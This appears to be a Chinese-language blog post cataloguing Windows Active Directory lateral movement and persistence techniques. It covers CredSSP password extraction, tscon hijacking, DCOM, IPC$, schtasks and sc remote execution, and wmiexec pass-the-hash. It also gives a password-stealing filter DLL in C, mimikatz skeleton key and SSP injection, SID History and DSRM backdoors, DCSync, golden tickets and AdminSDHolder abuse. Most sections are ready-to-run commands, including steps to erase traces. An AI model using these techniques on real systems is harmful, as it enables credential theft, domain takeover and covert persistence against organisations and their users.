[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png)

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png)

完事

credssp 导出用户明文密码
----------------

CredSSP 协议的目的是将用户的明文密码从 CredSSP 客户端委派给 CredSSP 服务器。 通常运用于远程桌面服务。

我们在配置这个协议时，一般在组策略编辑器里配置。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png)

Allow delegating default credentials 表示在通过使用受信任的 X509 证书或 Kerberos 实现服务器身份验证时自动发送当前用户的凭据，即明文密码。

Allow delegating default credentials with NTLM-only server authentication 表示在通过 NTLM 实现服务器身份验证时自动发送当前用户的凭据，即明文密码。

这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。

### 攻击原理

那么这样看，这个攻击流程就很自然了。  
我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。  
在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。  
然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.

### 实操

1. 通过修改注册表，改变组策略身份验证的凭据策略 (选一个），这一步需要管理员权限，本地或域管

```
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *
```

一股脑设置好就完事了。。（用户需重新登陆才生效）

然后开始获取密码

我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。  
我们用 kekeo 实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）

```
tsssp::server 开启服务端
tsssp::client /target:...   开启客户端，这里的target随便填
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png)

那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。

服务端建立: tsssp::server 需要 SYSTEM 权限

客户端链接: tsssp::client /target: 服务端的 SPN（一般采用 TERMSRV 服务） /pipe: \ 服务端域名 \ pipe\kekeo_tsssp_endpoint 普通用户权限即可

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png)

tscon 横向
--------

若一个机器上有多个用户登录，则在任务管理器可以看见如下场面

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png)

其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png)

但是对于 system 用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过 system 权限获取登录在当前机器上的域用户权限。  
比如上图中的 administrator 是域管，我有当前机器的 system 权限，那么我可以直接用以下命令完成用户权限获得。

query user 获得 administrator 用户的 id

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png)

可以发现 admin 的 id 是 2，那么我们就可以用 tscon 这个 windows 自带的命令行工具完成权限获得。

cmd /k tscon 2 /dest:console

执行以上命令，我们跳转到了 admin 的桌面

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png)

利用 COM/DCOM 对象
--------------

参考:[https://www.freebuf.com/articles/network/256372.html](https://www.freebuf.com/articles/network/256372.html)

### 前言

DCOM 是 COM 的扩展，允许应用程序实例化和访问远程计算机上的 COM 对象。  
这里简要说一下几个有关 COM 的概念

CLSID：又叫 CLASSID 一个 COM 类的唯一标识符，每一个 Windows 注册类与一个 CLSID 相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}

ProgID：其可被用作对用户更友好的替代的一个 CLSID，比如 MMC20.APPLICATION.1 就是一个 ProgID。ProgID 不能保证是唯一的，并非每个类都与 ProgID 相关联

Appid: 为了保证 COM 对象能被顺利的远程调用（即为了使 DCOM 可访问 COM 对象），需要把 APPID 与该类的 CLSID 相关联，且 AppID 需设置权限来规划哪些客户端能够访问

我们可以通过 powershell 执行 get-CimInstance 来列出本地 COM 程序列表

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png)

远程 DCOM 对象实例化的流程:

```
客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。
远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。
DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。
客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。
```

### MMC20.APPLICATION.1

中文名为： Microsoft 管理控制台（MMC）2.0 包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png)

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png)

如上图，我们先列出在 MMC20.APPLICATION 中的模块，然后继续列出其中 Document 中的属性，再继续列出 Document.ActiveView 中的属性。可以发现一个名为 ExecuteShellCommand 的方法，光是听名字就知道是可以执行 shell 命令的方法了。到微软文档查一查这个方法，获得了以下信息。

```
ExecuteShellCommand（[命令][目录][叁数][窗口状态]）
命令
一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。

目录
一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。

参数
一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。

窗口状态
一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。

“Maximized”
该命令在最大化的窗口中执行。

“Minimized”
该命令在最小化的窗口中执行。

“Restored”
该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框

返回值
此方法不返回值。
```

于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样

```
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png)

我们进一步发掘其横向移动的能力

我们知道 DCOM 具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用 GetTypeFromProgID() 与 powershell 进行 DCOM 远程交互。  
GetTypeFromProgID("COM","远程 ip") 即可指定与哪一个远程 IP 进行交互。所以我们可以把 payload 改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的

```
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application" ，“远程ip”)).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
```

ipc
---

### ipc 简介

IPC$ 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。

```
net use \\ip\ipc$ "password" /user:username
```

如果账户和口令正确，就建立好了链接。

建立好链接后就能执行以下命令

```
dir \\192.168.183.130\c$ 列出C盘
copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件
tasklist /S 192.168.183.130 /U administrator /P liu78963 列出某IP上的进程信息，/U指定哪个用户执行该命令，/p指定该用户密码
net use \\IP /del /y 删除链接
net use 查看已建立的ipc链接
```

### 利用 ipc 横向移动

#### at

```
at \\192.168.183.130 17:05:00 cmd.exe /c "<命令>"
at \\192.168.183.130 17:05:00 powershell.exe -c "<命令>"
```

关于时间的获得，可以使用 net time \\IP 获得。

计划任务执行后需要删除，不留痕迹

```
at \\192.168.183.130 1 /delete  //1为任务的ID
```

关于此方法我们可以先通过 copy 上传恶意文件然后通过 at 来执行它，或者直接通过 powershell 远程加载上线等

#### **schtasks**

at 命令已经被 Windows Vista、Windows Server 2008 及之后版本的操作系统废弃了，取而代之的是 schtasks 命令。

横向移动的大致思路与 at 差不多。

```
在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。
schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f 

但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上/u和/p参数分别设置高权限用户名和密码 
schtasks /create /s 192.168.183.130 /u username /p password /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f

另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上/u /p参数）
schtasks /run /s 192.168.183.130 /i /tn backdoor  // i：忽略任何限制立即运行任务

计划任务执行后需要清理痕迹
schtasks /delete /s 192.168.183.130 /tn "backdoor" /f
```

#### sc

这个命令可以操控服务。

```
sc \\[主机名/IP] create [servicename] binpath= "[path]"   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令
sc \\[host] start [servicename] 启动某个服务
sc \\[host] delete [servicename]   #删除服务
```

wmi
---

从 Windows 98 开始，Windows 操作系统都支持 WMI。WMI 是由一系列工具集组成的，可以通过 / node 选项使用端口 135 上的远程过程调用 (RPC) 进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且 wimc 执行命令时不会留下日志信息。

通过 wmic 在远程主机上开启进程

```
wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "command"
```

### wmiexec

通过 wmic 创建远程进程时，不会有回显，需要通过 ipc$ 链接 type，重定向等手段才能看到回显结果，就很不方便，wmicexec 的出现就很好的解决了这一痛点。具体原理是通过 wmic 在 135 端口进行交互，再把内容通过 445 端口传回来。

wmiexec 普遍来说有三种版本. py，exe，.vbs。可以走 socks5 协议代入内网，杜绝了 bypassav 的麻烦。  
(exe 版本网上似乎很不好找) 这里用 python 版本，下载链接 [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C) impacket 按照网上安装来弄就行了  
1. 环境 linux，我们配置好 proxychanis 代入内网（略  
2.proxychains wmiexec.py 域名 / 用户名: 密码 @ip 获得 shell  
3. 也可以进行 hash 传递 python wmiexec.py -hashes LM Hash:NT Hash 域名 / 用户名 @目标 IP

效果图

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png)

winrm
-----

​ winRm（微软远程管理）是 WS-Management 协议的实现组件。WinRM 是 windows 操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过 HTTP（5985）或 HTTPS SOAP（5986）执行，默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。 你需要管理员身份才能使用它。  
​ 适用版本: 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在 Win server 2012 之后的版本的 WinRM 服务才默认启动并监听了 5985 端口，允许远程任意主机来管理。

我们可以通过如下 powershell 命令查看机器上的 winrm 是否正常运行

```
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png)

若没开启，你可以在管理员权限下执行以下指令开启

```
winrm quickconfig -q
or
Enable-PSRemoting -Force
```

远程命令执行

```
winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami
```

Hook PasswordChangeNotify
-------------------------

原理：当用户修改密码时会输入明文密码，LSA 会调用 PasswordChangeNotify 在系统中同步密码。我们 HOOK 这个函数，改变其行为，就能达到获取用户修改后的密码的明文.

Tool: Powersploit 下的 Invoke-ReflectivePEInjection.ps1 （用于注入）  
[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)  
以及 [https://github.com/clymb3r/Misc-Windows-Hacking](https://github.com/clymb3r/Misc-Windows-Hacking) 的 HookPasswordChange.dll(需自行编译)

```
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
```

执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。

下面我们分析一下原理

当密码改变请求发生时，LSA 会调用 Password Filters。每一个 password filter 会先验证新密码的合法性和复杂度，然后 LSA 会发出请求已更改的信号。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png)

该过程由 password notification DLL 完成。所以我们只需要劫持这个 DLL，把它换成我们自定义的 DLL 即可达到目的。  
这种方式一般在 Server 服务器上利用率较高  
通常来说，这个 dll 文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa 的 notification packages 表项。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png)

我们要利用该方法，首先要确保密码策略已启用

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png)

至于命令行怎么修改。可以这样

```
secedit /export /cfg gp.inf /quiet   将组策略导出为文件
在该文件里将PasswordComplexity项值修改为1
然后用secedit /configure /db gp.sdb /cfg gp.inf /quiet 将其导入数据库
刷新组策略： gpupdate/force
重启后生效
```

下面我们构造 dll 文件去覆盖它。

首先我们的 dll 文件内容如下。

```
#include<Windows.h>
#include<NTSecAPI.h>
#include <fstream>

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() {
    OutputDebugString(L"InitializeChangeNotify");
    return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation)
{
    OutputDebugString(L"PasswordFilter");
    return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword)
{
    FILE *pFile;
    fopen_s(&pFile, "C:\\logFile.txt", "a+");
    fprintf(pFile, "%ws:%ws", UserName->Buffer, NewPassword->Buffer);
    return 0;
}
```

然后把这个 dll 文件放入 system32 文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa 的 notification packages 表项包括我们的恶意 dll 文件，具体命令行操作如下

```
REG ADD "HKLMSYSTEMCurrentControlSetControlLsa" /v "Notification Packages" /t REG_MULTI_SZ /d "evildll" /f
```

重启后生效。无奈的是我把 dll 文件写出来了且确保是正确的，在 win7 和 win2012 上复现均失败，网上成功的例子是 win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了

万能密码
----

运用 mimkatz 可以在域控机上对所有用户添加一个统一密码用来登录.

```
mimikatz# privilege::debug
mimikatz# misc::skeleton
```

然后所有用户都能用密码 mimiaktz 登陆了

SSP 注入
------

ssp: 一个 DLL 文件，用来实现 Windows 身份验证功能，比如 kerberos，ntlm。系统启动时 SSP 会被自动加载入 lsass.exe  
sspi:SSP 的 API 接口

如果我们自定义个恶意 dll 文件让他在系统启动时自动加载到 lsass.exe, 就能得到进程中的明文密码

临时性注入 (重启便失效)

```
mimikatz# privilege::debug
mimiaktz# misc::memssp
```

执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png)

长期性注入（重启不失效）

把 mimikatz 中的 mimilib.dll 放到系统的 C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。

修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的 DLL 文件

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png)

用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log

SID History 后门
--------------

sid history: 当我们把域 A 的用户 x 迁移到域 B 时，B 域中 x 的 sid 会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history 诞生了， 系统会将其原来的 SID 添加到迁移后用户的 SID History 属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。

在域控上

```
privilege::debug
sid::patch
sid::add /sam:const27 /new:administrator 将administrator的SID添加到const27的sid history属性
```

然后可以在域控上验证其 sid history 是否更改成功

```
Import-Module activedirectory
Get-ADUser const27 -Properties sidhistory
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png)

可以发现现在是有 SIDHistory 属性了。而且末尾的 500 预示着 ADMIN 权限

DSRM 后门
-------

DSRM 账号: 每个域控上都有一个本地管理员账户也就是 DSRM 账户，用于在域环境出现故障时本地登录进行修复. 可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为 Windows Server 2003，则不能使用该方法进行持久化操作。 ）

我们先设置 DSRM 密码  
域控上输入 ntdsutil  
然后输入 reset password on server null  
然后键入密码，最后按 q 退出即可

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png)

在 mimikatz 中 dump 本地 hash 可以看到多出来个 Administrator

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png)

然后设置 DSRM 登陆方式  
DSRM 登陆方式有三种分别对应 123.

*   0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号
*   1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器
*   2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器

我们需要将他改成 2 才行。powershell 执行

```
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
```

即可. 然后直接 psexec 登录 (这里用的是 cs)

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png)

注意填 Realm 时要填上面 dump 出 sam 时的域名（这里是 DC）

委派后门
----

这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的 ST2 保存起来，或者非约束性委派得到的 TGT，要用的时候加载进内存就行了

DCSYNC
------

这个东西 可以实现不登录到域控而获取域控上的数据  
获得以下权限就可以使用了

*   Administrators 组内的用户
*   Domain Admins 组内的用户
*   Enterprise Admins 组内的用户
*   域控制器的计算机帐户

然后在 mimikatz 里  
privilege::debug  
lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png)

然后我们就可以通过 krbtgt hash 制作黄金票据登录 administrator。  
如果还想隐蔽一点，可以给普通用户添加如下 ACE, 使其获得 dcsync 权限

*   DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
*   DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
*   DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)

可以以管理员权限运行 powerview.ps1 完成以上操作

```
#给域用户hack添加以上三条ACE
Add-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync -Verbose

#给域用户hack删除以上三条ACE
Remove-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync -Verbose
```

然后普通用户也可以用 mimikatz 调用 dcsync 导出 hash 了

### 配合 EXCHANGE 用户达到域提权目的

前提: 一个 exchange 高权限组的用户控制权，一个机器账户

exchange 安装后会在 AD 上生成两个容器

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png)

其中 exchange windows permissions 组的用户拥有 writeDACL 权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承 writedacl 权限，有这个权限后就能使用 dcsync 导出所有用户 hash。  
其中 exchange trusted subsystem 组甚至可能有继承自 administrators 组的权限。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png)

假设我们已经拿到了 exchange trusted subsystem 中一个用户的控制权。  
那么就可用 dysync 进行权限维持了

黄金票据生成
------

```
#提权
privilege::debug

#生成黄金票据并导入
kerberos::golden /user:administrator /domain:const.com /sid:当前用户sid去掉最后一个数据 /krbtgt:krbtgt的hash /ptt
```

AdminSDHolder
-------------

AdminSDHolder 是一个特殊容器，用作受保护用户或组的 ACM 模板。AD 定期把 AdminSDHolder 对象的 ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改 AdminSDHolder 对象的 ACL，那么修改的权限将自动应用于所有受保护的 AD 账户和组，这可以作为一个域环境权限维持的方法 。

如何寻找受保护用户或组：

受保护用户或组的 **AdminCount 属性为 1** 。 但是，如果对象已移出受保护组，其 AdminCount 属性仍为 1，也就是说，有可能获得曾经是受保护组的帐户和组 。

使用 powerview.ps1`Get-NetUser -AdminCount`即可获得受保护用户  
`Get-NetGroup -AdminCount`即可获得受保护组

如何修改 ADMINSDHOLDER 的 ACL

域管执行以下命令 (powerview.ps1)

```
Add-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=CONST,DC=COM" -PrincipalIdentity xx -Verbose -Rights ALL
给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png)

然后默认等 60 分钟，待 ADMINSDHOLDER 生效后，xx 就获得所有受保护对象的完全控制权了[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png)